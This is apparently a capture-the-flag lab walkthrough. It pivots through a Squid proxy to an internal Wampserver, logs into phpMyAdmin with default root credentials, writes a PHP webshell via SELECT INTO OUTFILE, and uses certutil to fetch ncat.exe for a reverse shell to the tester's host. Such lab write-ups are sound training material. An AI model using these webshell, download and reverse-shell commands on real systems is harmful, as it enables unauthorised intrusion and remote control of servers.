**HyperText Transport Protocol**

# Environment Variables / Setup

```
export IP=192.168.159.189
export PORT=3128
export URL=http://$IP:$PORT
```

# Phase 1: Initial Reconnaissance

## Technology Stack Identification

### whatweb
`whatweb $URL`

```
p://192.168.159.189:3128 [400 Bad Request] Content-Language[en], Country[RESERVED][ZZ], Email[webmaster], HTTPServer[squid/4.14], IP[192.168.159.189], Squid-Web-Proxy-Cache[4.14], Title[ERROR: The requested URL could not be retrieved], UncommonHeaders[x-squid-error], Via-Proxy[1.1 SQUID (squid/4.14)], X-Cache[SQUID]
```

### Check Response Headers
`curl -I $URL`

```
HTTP/1.1 400 Bad Request
Server: squid/4.14
Mime-Version: 1.0
Date: Sun, 24 Aug 2025 16:28:03 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 3394
X-Squid-Error: ERR_INVALID_URL 0
Vary: Accept-Language
Content-Language: en
X-Cache: MISS from SQUID
Via: 1.1 SQUID (squid/4.14)
Connection: close
```

## Directory Enumeration
`ffuf -u $URL/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 404 -t 50`

(None)
# Phase 2: Manual Enumeration

![[Pasted image 20250824092932.png]]

The software running is Squid Cache version 4.14.

https://www.squid-cache.org/

Searching online for this version leads me to discovering CVE-2020-25097, but this affected versions < 4.14, and 4.14 was the patch to remediate it.
https://github.com/squid-cache/squid/security/advisories/GHSA-jvf6-h9gj-pmj6

Looking through Squid-Cache docs, I found that there should be a known management page at  `/squid-internal-mgr`, but we can't reach it.

![[Pasted image 20250824094746.png]]

## Enumerating via Squid HTTP Proxy
HackTricks has a page on Squid: https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html

By appending the following line to `/etc/proxychains.conf` we see that we're able to use the HTTP proxy to scan the target internally.

`http 192.168.159.189 3128`

`proxychains nmap --min-rate 4500 --max-rtt-timeout 1500ms -p- -Pn localhost`

```
PORT      STATE SERVICE
8080/tcp  open  http-proxy
44619/tcp open  unknown
46629/tcp open  unknown
```

We can conduct further scans using the same method, but I'll open it in Chromium:

## Wampserver Internal Dashboard

`chromium --proxy-server="http://192.168.159.189:3128" --disable-web-security`

Navigate to `http://192.168.159.189:8080`:

![[Pasted image 20250824103332.png]]

This Wampserver dashboard gives a wealth of information about the web server's stack and versions.

### phpinfo
The link to phpinfo (http://192.168.159.189:8080/?phpinfo=-1) gives direct access to phpinfo:

![[Pasted image 20250824103512.png]]

Looking through the config, we find that file_upload is set to on. This could allow for RCE, so a big find. I'll save this script to try next: https://github.com/roughiz/lfito_rce 

### phpMyAdmin with Default Credentials

On http://192.168.159.189:8080/phpmyadmin/ , I'm able to log in with default credentials (root with empty password), which is another huge finding. 

![[Pasted image 20250824104900.png]]

## Creating a webshell via phpMyAdmin

This blog gives some helpful advice on how to proceed for gaining remote code execution: https://www.netspi.com/blog/technical-blog/network-pentesting/linux-hacking-case-studies-part-3-phpmyadmin/#1

Our goal is to use our SQL access via phpmyadmin to write a webshell under the target's web root, which will then allow us to make HTTP requests to that webshell to gain remote code execution.

phpinfo lists the document root as `C:/wamp/www`, so we want to write a php file under this location.

First we need to ensure secure_file_priv is not set:

`SHOW VARIABLES LIKE 'secure_file_priv';`

 ![[Pasted image 20250824105905.png]]

  It looks like we should be clear to upload (although it's also possible that NTFS filesystem permissions could prevent us from writing to certain locations)!

```
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE 'C:/wamp/www/shell.php';
```

![[Pasted image 20250824110002.png]]

Navigating to http://192.168.159.189:8080/shell.php?cmd=whoami, we can confirm that we have RCE as NT Authority/System.

![[Pasted image 20250824110223.png]]

Same thing using curl:

`curl --proxy $IP:3128 $IP:8080/shell.php?cmd=whoami`

![[Pasted image 20250824110601.png]]

## Reverse Shell

Lastly, I want a reverse shell, even though we're already capable of retrieving the flag.

I'll download a portable binary of ncat.exe for 64-bit Windows to my attacking machine and serve it:
```
curl -O https://nmap.org/dist/ncat-portable-5.59BETA1.zip
unzip ncat-portable-5.59BETA1.zip
cd ncat-portable-5.59BETA1
python3 -m http.server 80
```

Download ncat.exe to the target:
`curl -x http://$IP:3128 -G --data-urlencode "cmd=certutil -urlcache -split -f http://192.168.45.244/ncat.exe C:\Windows\Temp\ncat.exe" http://$IP:8080/shell.php`

![[Pasted image 20250824113245.png]]

Now we need to start a listener on our attacking machine...

`nc -lnvp 1234`

... and use use ncat.exe on the target to establish a reverse shell:

`curl -x http://$IP:3128 -G --data-urlencode "cmd=C:\Windows\Temp\ncat.exe 192.168.45.244 1234 -e cmd.exe" http://$IP:8080/shell.php`

![[Pasted image 20250824113815.png]]

I'll also transfer SauronEye.exe to help locate the flags:

```
powershell -ep bypass
iwr http://192.168.45.244:80/SauronEye.exe -o .\SauronEye.exe
.\SauronEye.exe
```


![[Pasted image 20250824115018.png]]
